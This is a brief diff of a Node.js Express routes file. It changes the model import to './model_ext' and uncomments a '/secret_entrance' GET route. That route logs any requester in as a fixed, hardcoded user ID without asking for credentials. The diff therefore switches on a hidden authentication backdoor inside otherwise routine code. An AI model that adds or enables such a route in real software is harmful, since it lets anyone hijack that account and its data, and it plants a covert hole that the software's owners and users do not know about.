@@ -1,6 +1,6 @@
 var app = require('./index');
 var multer = require('multer');
-var model = require('./model');
+var model = require('./model_ext');
 var fs = require('fs');
 var path = require('path');
 var mkdirp = require('mkdirp');
@@ -124,9 +124,9 @@ app.delete('/items/:iid/pictures/:p', function(req, res){
 	})
 });
 
-/*app.get('/secret_entrance', function(req, res){
+app.get('/secret_entrance', function(req, res){
 	model.User.get('58ce66dd24598a74addd93ba', function(result){
 		req.session.uid = result.user._id;
 		res.send('Login success!\n');
 	})
-});*/
+});
